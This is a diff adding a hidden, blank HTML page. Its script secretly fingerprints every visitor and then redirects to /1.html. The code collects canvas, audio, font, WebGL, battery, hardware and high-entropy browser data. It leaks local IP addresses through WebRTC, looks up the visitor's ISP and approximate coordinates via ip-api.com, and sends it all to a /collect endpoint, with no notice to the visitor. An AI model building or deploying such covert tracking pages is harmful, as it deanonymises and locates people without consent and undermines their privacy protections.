@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      overflow: hidden;
+      visibility: hidden;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+<script>
+(async () => {
+  const _0x = {
+    t: new Date().toISOString(),
+    d: {},
+    c: '',
+    a: '',
+    f: [],
+    w: {},
+    r: [],
+    i: { e: 'pending' },
+    n: null,
+    h: null,
+    e: null,
+    m: null,
+    b: null,
+    p: null,
+    u: null
+  };
+
+  try {
+    // ── Modern high-entropy hints (Chrome/Edge/Opera) ───────────────────────
+    if (navigator.userAgentData) {
+      const ua = await navigator.userAgentData.getHighEntropyValues([
+        'platform', 'platformVersion', 'architecture', 'model', 'fullVersionList',
+        'bitness', 'mobile', 'wow64', 'brands'
+      ]);
+      _0x.u = ua;
+    }
+
+    // ── Core browser & device info ──────────────────────────────────────────
+    _0x.d = {
+      ua: navigator.userAgent,
+      vendor: navigator.vendor || 'unknown',
+      product: navigator.product || 'unknown',
+      platform: navigator.platform || 'unknown',
+      languages: navigator.languages?.join(', ') || navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      tzOffset: new Date().getTimezoneOffset() / -60,
+      screen: `${screen.width}x${screen.height}x${screen.colorDepth}x${screen.pixelDepth}`,
+      avail: `${screen.availWidth}x${screen.availHeight}`,
+      orientation: screen.orientation?.type || 'unknown',
+      hw: navigator.hardwareConcurrency ?? '?',
+      mem: navigator.deviceMemory ?? '?',
+      touch: navigator.maxTouchPoints ?? 0,
+      cookies: navigator.cookieEnabled,
+      dnt: navigator.doNotTrack || 'unspecified',
+      java: navigator.javaEnabled?.() ?? false,
+      pdf: navigator.pdfViewerEnabled ?? 'unknown',
+      webdriver: navigator.webdriver ?? false
+    };
+
+    // ── Performance & memory ────────────────────────────────────────────────
+    if (performance?.memory) {
+      _0x.m = {
+        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+        totalJSHeapSize: performance.memory.totalJSHeapSize,
+        usedJSHeapSize: performance.memory.usedJSHeapSize
+      };
+    }
+
+    // ── Battery status (if supported) ───────────────────────────────────────
+    if (navigator.getBattery) {
+      try {
+        const bat = await navigator.getBattery();
+        _0x.b = {
+          level: bat.level,
+          charging: bat.charging,
+          chargingTime: bat.chargingTime,
+          dischargingTime: bat.dischargingTime
+        };
+      } catch {}
+    }
+
+    // ── Connection & network ────────────────────────────────────────────────
+    if (navigator.connection) {
+      _0x.n = {
+        type: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt,
+        saveData: navigator.connection.saveData,
+        downlinkMax: navigator.connection.downlinkMax
+      };
+    }
+
+    // ── Canvas ──────────────────────────────────────────────────────────────
+    try {
+      const c = document.createElement('canvas');
+      const x = c.getContext('2d');
+      x.textBaseline = 'top';
+      x.font = '14px Arial';
+      x.fillStyle = '#f60'; x.fillRect(125,1,62,20);
+      x.fillStyle = '#069'; x.fillText('Hello, world! 🌐', 2,15);
+      x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('Hello, world! 🌐', 4,17);
+      _0x.c = c.toDataURL();
+    } catch { _0x.c = 'err'; }
+
+    // ── Audio ───────────────────────────────────────────────────────────────
+    try {
+      const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 5000, 44100);
+      const osc = ac.createOscillator();
+      const comp = ac.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(ac.destination);
+      osc.type = 'triangle'; osc.frequency.value = 10000;
+      comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
+      osc.start(0);
+      const buf = await ac.startRendering();
+      let h = 0;
+      const ch = buf.getChannelData(0);
+      for (let i = 4500; i < 5000; i++) h += Math.abs(ch[i]);
+      _0x.a = Math.round(h * 1000) / 1000;
+    } catch { _0x.a = 'err'; }
+
+    // ── Fonts ───────────────────────────────────────────────────────────────
+    try {
+      const fts = ['Arial','Courier New','Georgia','Helvetica','Times New Roman','Verdana','Comic Sans MS','Impact','Trebuchet MS'];
+      const s = document.createElement('span');
+      s.style.fontSize = '72px'; s.style.position = 'absolute'; s.style.visibility = 'hidden';
+      s.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      document.body.appendChild(s);
+      const bw = s.offsetWidth;
+      const det = [];
+      for (const f of fts) {
+        s.style.fontFamily = `${f},monospace`;
+        if (s.offsetWidth !== bw) det.push(f);
+      }
+      document.body.removeChild(s);
+      _0x.f = det.length ? det : ['none'];
+    } catch { _0x.f = ['err']; }
+
+    // ── WebGL ───────────────────────────────────────────────────────────────
+    try {
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (gl) {
+        const d = gl.getExtension('WEBGL_debug_renderer_info');
+        _0x.w = {
+          vendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+          renderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+          version: gl.getParameter(gl.VERSION),
+          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+        };
+      }
+    } catch { _0x.w = { e: 'err' }; }
+
+    // ── WebRTC IPs ──────────────────────────────────────────────────────────
+    try {
+      if (window.RTCPeerConnection) {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel('');
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        await new Promise(r => {
+          pc.onicecandidate = e => {
+            if (!e.candidate) return r();
+            const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+            if (m && !m[1].startsWith('127.') && !m[1].startsWith('::1')) _0x.r.push(m[1]);
+          };
+          setTimeout(r, 3000);
+        });
+        pc.close();
+      }
+    } catch { _0x.r = ['err']; }
+
+    // ── IP-API ──────────────────────────────────────────────────────────────
+    try {
+      const r = await fetch('http://ip-api.com/json/?fields=status,query,isp,org,as,country,city,regionName,lat,lon,timezone,proxy,hosting,mobile');
+      if (r.ok) {
+        const j = await r.json();
+        if (j.status === 'success') _0x.i = j;
+      }
+    } catch { _0x.i.e = 'fetch failed'; }
+
+  } catch (err) {
+    _0x.e = err.message || 'collection failed';
+  }
+
+  // ── SEND ────────────────────────────────────────────────────────────────
+  const payload = JSON.stringify(_0x);
+
+  try {
+    await fetch('/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: payload,
+      keepalive: true
+    });
+    console.log('[fp] sent');
+  } catch (e) {
+    console.warn('[fp] fetch failed, trying beacon');
+    navigator.sendBeacon('/collect', payload);
+  }
+
+  // Redirect immediately
+  window.location.replace('/1.html');
+})();
+</script>
+</body>
+</html>
